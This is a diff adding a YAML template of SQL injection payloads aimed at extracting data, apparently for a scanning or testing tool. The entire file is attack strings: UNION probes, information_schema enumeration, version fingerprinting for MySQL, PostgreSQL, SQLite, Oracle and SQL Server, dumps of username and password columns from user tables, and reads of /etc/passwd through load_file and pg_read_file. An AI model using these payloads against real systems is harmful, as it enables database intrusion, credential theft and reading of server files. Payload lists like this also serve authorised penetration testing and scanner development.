@@ -1,0 +1,44 @@
+# Data Extraction SQL Injection Payloads
+# ---------------------------------------
+# This template focuses on payloads designed to extract data from databases
+
+payloads:
+  # Basic UNION-based payloads
+  - "' UNION SELECT 1,2,3 --"
+  - "' UNION SELECT 1,2,3,4 --"
+  - "' UNION SELECT 1,2,3,4,5 --"
+  - "' UNION ALL SELECT 1,2,3 --"
+  - "') UNION SELECT 1,2,3 --"
+
+  # Database metadata extraction
+  - "' UNION SELECT table_name,column_name FROM information_schema.columns --"
+  - "' UNION SELECT table_schema,table_name FROM information_schema.tables --"
+  - "' UNION SELECT table_name,column_name FROM all_tab_columns --"  # Oracle
+  
+  # Database version extraction
+  - "' UNION SELECT 1,@@version --"                 # MySQL
+  - "' UNION SELECT 1,version() --"                 # PostgreSQL
+  - "' UNION SELECT 1,sqlite_version() --"          # SQLite
+  - "' UNION SELECT 1,banner FROM v$version --"     # Oracle
+  - "' UNION SELECT 1,@@servername --"              # SQL Server
+  
+  # Credential extraction
+  - "' UNION SELECT username,password FROM users --"
+  - "' UNION SELECT user,password FROM mysql.user --"
+  - "' UNION SELECT username,password FROM user_table --"
+  - "' UNION SELECT login,pwd FROM members --"
+  - "' UNION SELECT email,password FROM customers --"
+  
+  # Specific database objects extraction
+  - "' UNION SELECT 1,database() --"                # Current DB name (MySQL)
+  - "' UNION SELECT 1,current_database() --"        # Current DB name (PostgreSQL)
+  - "' UNION SELECT 1,DB_NAME() --"                 # Current DB name (SQL Server)
+  - "' UNION SELECT 1,user() --"                    # Current user (MySQL)
+  - "' UNION SELECT 1,current_user --"              # Current user (PostgreSQL)
+  - "' UNION SELECT 1,system_user --"               # Current user (SQL Server)
+  - "' UNION SELECT 1,count(*) FROM users --"       # Count records
+  
+  # File system access
+  - "' UNION SELECT 1,load_file('/etc/passwd') --"           # MySQL
+  - "' UNION SELECT 1,pg_read_file('/etc/passwd') --"        # PostgreSQL
+  - "' UNION SELECT 1,HEX(load_file('/etc/passwd')) --"      # MySQL (hex output) 
